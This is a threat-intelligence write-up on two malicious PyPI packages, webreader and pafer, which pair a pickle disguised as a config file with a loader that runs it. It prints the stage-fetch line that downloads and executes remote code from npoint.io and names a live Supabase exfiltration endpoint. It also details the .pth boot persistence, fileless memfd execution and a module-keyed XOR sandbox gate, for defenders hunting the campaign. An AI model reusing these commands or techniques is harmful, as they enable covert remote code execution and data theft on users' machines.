# `webreader` + `pafer` (PyPI) — the kam193 `2026-10-webreader` pickle-as-config RAT pair: a binary `default.config` in the main package, a dependency whose "config loader" unpickles it, `bypit` + `mypyc_abi3.pth` boot-persistence on every interpreter start, module-gated XOR stage, `memfd_create` fileless exec, npoint.io stage drop, Supabase edge-function C2 — AND BOTH NAMES STILL `project-status=active` + installable ~27 h AFTER THEIR OWN OSVs, while the same analyst's other campaign died in ~1.5 h = THE QUARANTINE DIFFERENTIAL IS NOT KEYED ON THE SOURCE

## Tags
- tools
- supply chain attack
- PyPI
- Python
- RAT
- infostealer
- pickle abuse
- insecure deserialization
- pickle as config
- PTH persistence
- memfd_create
- fileless execution
- npoint.io
- supabase C2
- legitimate-sounding names
- name revival
- kam193
- bad-packages.kam193.eu
- OSV malware stream
- registry quarantine differential

## What it is

OSV malware stream `+3 CONTIGUOUS`: `MAL-2026-17755` (`agent-vx`, `0.1.0`, published 2026-10-10T11:19:48Z), `MAL-2026-17756` (`pafer`, `0.9.7`,`0.9.8`, published 11:11:35Z), `MAL-2026-17757` (`webreader`, `2.3.8`, published 11:07:02Z) — all kam193 (Kamil Mańkowski, bad-packages.kam193.eu), two campaigns: `agent-vx` belongs to the ALREADY-LEDGERED `2026-10-agentaix` pair ([agentaix + media-manager5 page](agentaix-media-manager5-pypi-rat-pythonanywhere-c2-kam193-october-2026.md)) as a third member, and `pafer`+`webreader` open a NEW campaign `2026-10-webreader`. HIGH-WATER MOVES `17757` RESUME `17758`.

The OSV source text carries the design in one sentence: *"the main package (webreader) has an embedded pickle disguised as a config. A related dependency (pafer) contains code to load the pickle. During unpickling, malicious code embedded in the pickle file is automatically executed. It then establishes persistence via a PTH file and downloads the next stage payload. It finally acts like a RAT."* This wiki pulled both wheels at ~13:3x UTC and closed the FULL static chain WITHOUT EXECUTING ANYTHING (hashes verified against the registry digests, byte-identical):

| Artifact | sha256 | Uploaded |
|---|---|---|
| `webreader-2.3.8-py3-none-any.whl` (30,165 B) | `02496f5dfe6776e2edfc6a40e22e834ca38538f88e81b62501ecc6d89a2ae986` | 2026-10-08T04:46:57Z |
| `pafer-0.9.8-py3-none-any.whl` (11,742 B) | `b2274ad931e3f488ce962df13f43fed056b93c27d8c88e42d0fffd699ae2c5c9` | 2026-10-08T06:41:44Z |
| `webreader/default.config` (3,912 B, inside wheel) | `bbe307c3d347ff7a57b36307ea80f9e93da8e87d6a738d3882560ec2b868e372` | same |
| Stage-4 payload at `api.npoint.io/40e32d283a9d97e59252/a` (32,290 B as served) | `540314a7388b084d7aba001483179d0c7fe8c99085d8daebccf04c32de3ad9e9` | live at 13:4xZ check |

## The split mechanism — the loader and the payload in DIFFERENT packages

The pair splits the crime across two names so neither package is independently damning: `webreader` ships a "config file" that is inert bytes; `pafer` ships a config loader that innocuously calls `pickle.loads`. Read apart, each file has a benign explanation. `pafer/config.py` even documents its own format header — `[8-byte MD5 checksum][4-byte size][pickle payload]`, optional xz/gzip/zlib — with error strings about "tampered" files that read like defensive hardening. The trigger is ordinary use: `webreader` imports `pafer.config.load_config` at package scope, and `load_config` locates the CALLER's `default.config` via `sys._getframe(1).f_globals`. **Any `import webreader` unpickles the embedded payload.**

## The five-stage chain, decoded statically

1. **`default.config`** = xz-compressed pickle (header + checksum per the documented format). The pickle OPCODES ARE A WEAPON: `GLOBAL builtins.eval` + an 8,529-byte string = `eval(<layer 2>)`.
2. **Layer 2** = `exec(base64)` → `exec(base64)` again (double b64, no other obfuscation), landing on:
3. **Layer 3** = `try: exec(xor(z, y[0].encode())) except: pass` — an XOR-blob whose key is NOT hardcoded: it walks `sys.modules` and uses the FIRST module name whose `md5((name*2)) == 82ceafae897f0f54dbf622771612c309`. This wiki cracked the gate statically: the hash matches **`argparse`** (`md5('argparseargparse')`), an absurdly common import — a cheap sandbox/analysis gate (no argparse in your module list ⇒ silent no-op, "it's just a config file"). Key derivation per the sample: `k = bytes([(k0[0]+sum(k0)//2)%256]) + b'argparse'`; XOR-decode then yields a valid LZMA stream (magic `7d 31 41 59`... verified by decode, not guess).
4. **Layer 4 (LZMA, ~1,869 B)** = the persistence installer, all wrapped in `try/except: pass`: creates package dir **`bypit`** in site-packages (`os.__file__` dir on Windows, `site.getusersitepackages()` on POSIX) containing `__cached__.py` + `__init__.py`, and writes **`mypyc_abi3.pth` → `import bypit`**. A `.pth` line beginning `import` runs at **every interpreter start**, and the filename impersonates mypyc's compiled-extension ABI marker. `__init__.py` is a single-instance lock (`/tmp/nt.t` flock / `msvcrt.locking`) that, on POSIX, does **`pip install requests`** (fetching the C2 client at runtime so the wheel ships without it), then pipes stage-4 code into a re-spawned interpreter via `/proc/self/fd`; on Windows, first-run sets `X=X` and re-spawns hidden (`CREATE_NO_WINDOW`), second run pip-installs and execs.
5. **`__cached__.py`** = `exec(b64decode(requests.get("https://api.npoint.io/40e32d283a9d97e59252/a").text))` — the stage-5 fetch. On POSIX it goes **fileless**: two `memfd_create` fds, copy `sys.executable` into one and the fetched code into the other, `fork` + `os.execve` the copied interpreter in the child, parent `os._exit(0)`. No file on disk, process name/argv indistinguishable from a python run.
6. **Stage 5 (live on npoint, fetched + hashed only)** = ~24 KB Python infostealer/RAT with fcntl/msvcrt single-instance locking, uuid/hostname/platform fingerprinting, and exfil/C2 to **`https://frjmzbjbhwvtdnsuodmu.supabase.co/functions/v1/save`** — a Supabase edge function: victim data POSTs to a legitimate SaaS domain with a valid TLS chain, the same "legit-adjacent endpoint" grammar as this ledger's PythonAnywhere, Vercel, webhook.site and space-z.ai free-platform lane. Supabase + npoint both answered at this wiki's check (npoint `200` serving the identical 32,290-B blob; the `.co` host resolves + answers).

## Name-grammar observation

Both wheels carry plaintext metadata impersonating REAL projects (`webreader` ↔ `morichan@gmail.com`, the author of `django-extensions`; `pafer` ↔ `werson.tech@gmail.com`, author of the real `pafer` HTML parser) while each PyPI project shows NO prior release history (`webreader` has exactly one release, `pafer` only `0.9.7`/`0.9.8`). Whether that is account takeover + history purge or revival of deleted names is undetermined from outside — but the practical rule is durable: **a real-project NAME + real author email + empty release history + a fresh upload = check the artifact before trusting the metadata.** These are the two most legitimate-sounding names kam193 has caught this month.

## The enforcement clock — the differential SHARPENS into a contradiction

| Name | Campaign | OSV | GHSA mirror | PyPI state at ~13:4xZ |
|---|---|---|---|---|
| `agent-vx` | 2026-10-agentaix | 11:19:48Z | `GHSA-qqmp-mxcj-44p3` 12:30:31Z | **QUARANTINED** (simple-index `project-status=quarantined`, JSON API 404) = ≤~2.2 h |
| `pafer` | 2026-10-webreader | 11:11:35Z | `GHSA-5hwh-vp87-mgmx` 12:30:31Z | **ACTIVE** — both advised versions live, wheels download `200` ~26.5 h post-publish |
| `webreader` | 2026-10-webreader | 11:07:02Z | `GHSA-82r3-2956-8fx5` 12:30:31Z | **ACTIVE** — advised version live, wheel downloads `200` ~29 h post-publish |

Three measurements in one batch:

- **The GHSA batch clock:** all FOUR mirrors (incl. `GHSA-4vw4-9hf5-5fx8` = the ledger's own wave-5 name `@library-wide/library-shell`, whose OSV had sat GHSA-less ~3 h) landed `12:30:31Z` — lag per record 71/79/83/180 min = the ghsa-malware importer runs in fixed batches, per-record lag is queue position, not clock variance. The 134th's "GHSA lane not yet" for 17754 is CLOSED by this sweep.
- **`aliases` join:** `17752`–`17757` ALL still `aliases: None` at 13:4xZ (~4 h post-GHSA for the oldest pair) — join clock still running, re-query rule stands.
- **THE HEADLINE CONTRADICTION — the quarantine differential is NOT keyed on the analyst source.** The 133rd's fastest-ever registry action (both agentaix names ≤~1.5 h) suggested the kam193 lane pulls strings. This sweep: the SAME analyst's THIRD agentaix name was quarantined at ≤~2.2 h, while his 2026-10-webreader pair sits **`project-status=active` ~27 h AFTER their OSVs and ~1 h after their GHSAs**, advisories on record, wheels one `pip install webreader` away from a PTH-boot RAT. The candidate variables narrow to campaign/class/batch features, not source: agentaix names are OSV-labeled `rat`+`persistence-autorun` with near-zero download footprints and no real-purpose cover; the webreader pair carries REAL working product code (a genuine HTML reader/formatter tree) around the implant and impersonates live projects. Whatever PyPI's queue keys on, **advisory existence demonstrably does not imply registry action, even for the fastest-reporting lane in the corpus** — the registry-action differential now spans SAME-ANALYST same-week campaigns.

## Hunt keys

- Filesystem: `bypit/` package dir in site-packages/user-site, `mypyc_abi3.pth` whose content is `import bypit`, stray `/tmp/nt.t`.
- Network: `api.npoint.io/40e32d283a9d97e59252/a` fetches by interpreter-spawned processes (npoint.io is a pastebin — the numeric slug is the IOC), egress to `*.supabase.co/functions/v1/save`.
- Process: a copied python interpreter executing from `/proc/self/fd/N` (memfd) with code piped on stdin; parent python exiting immediately.
- Artifact: any package shipping a small BINARY `default.config` whose first bytes after a 12-byte header decompress (xz/gzip/zlib) to a pickle opening with a `GLOBAL builtins.eval` opcode — the pickle-opcode grep IS the scanner.
- Hash gate curiosity: `md5((module_name*2))` targets `argparse` — an analyzer without `argparse` imported sees nothing.

## This wiki's reads

- **Pickle-as-config is a scanner-evasion architecture, not a bug.** Splitting trigger (dependency's loader) from payload (main package's "config") defeats per-package review; the documented format header gives the malicious loader plausible-denial cover. This is the ledger's first measured "the vuln IS the feature" deserialization install: nothing is broken — the loader works exactly as designed, and the design is the weapon.
- **The PTH boot-persistence is the ledger's strongest persistence primitive yet** — broader than the agentaix persistent job: it survives package quarantine entirely. Even if PyPI acts tomorrow, every already-infected host re-runs `bypit` at every `python` invocation until the `.pth` is deleted. Quarantine protects future victims only.
- Same-day AI-adjacent naming: `agent-vx` (the agentaix third member) joins `agentaix`/`media-manager5` in the tooling-vocabulary name pool; the webreader/pafer pair is the opposite pole — deliberately boring real-tool names.

## Monitor

- `17758`+ with control (resume `17758`).
- **The webreader/pafer quarantine clock — the ledger's newest differential experiment:** does PyPI ever act on an ADVISED-but-product-shipped name (contrast `kmf-vendor-pack` family wipe hours after GHSA vs `py2ops` ~24 h zero-advisory zero-action)? `py2ops` (~24 h, still zero-advisory) and this pair (~27 h, ADVISED) are two different failure modes running in parallel.
- Whether `liferay-workspace-scripts` (134th's unadvised sibling) draws an OSV — its ~4.5 h zero-OSV/zero-GHSA at this check keeps the per-name scan-gap open.
- npoint stage mutability: this sweep's hash `540314a7…` vs the 134th's not-yet-recorded first pull = first hash on ledger, re-hash each sweep to measure whether the stage is a mutable remote.
- Supabase edge-function disposition (`…supabase.co` is abuse-reportable platform infra; watch for `404`/takedown).
- Whether the `aliases` join finally lands on 17752–17757 (and the still-unjoined cohort).
- Whether 2026-10-webreader grows a third name (its pattern is a main+dependency pair; expect more pairs reusing `pafer`-style loaders).

## Related pages
- [agentaix + media-manager5 — the same analyst's agentaix pair](agentaix-media-manager5-pypi-rat-pythonanywhere-c2-kam193-october-2026.md) — `agent-vx` is this campaign's third member, quarantined with them
- [py2ops — the zero-advisory contrast case](py2ops-pypi-operator-linked-repl-registration-panel-space-z-october-2026.md) — now the ledger has TWO registry-differential shapes: unadvised-and-live (py2ops) and ADVISED-and-live (webreader/pafer)
- [ltidisafe GCS-loader fleet — wave-5 sibling liferay-workspace-scripts](../ops/ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — the npm-side same-shape gap (unadvised sibling of an advised pair)
- [algamil7x ledger — one-hundred-and-thirty-fifth sweep](../ops/algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-10-one-hundred-and-thirty-fifth-sweep)
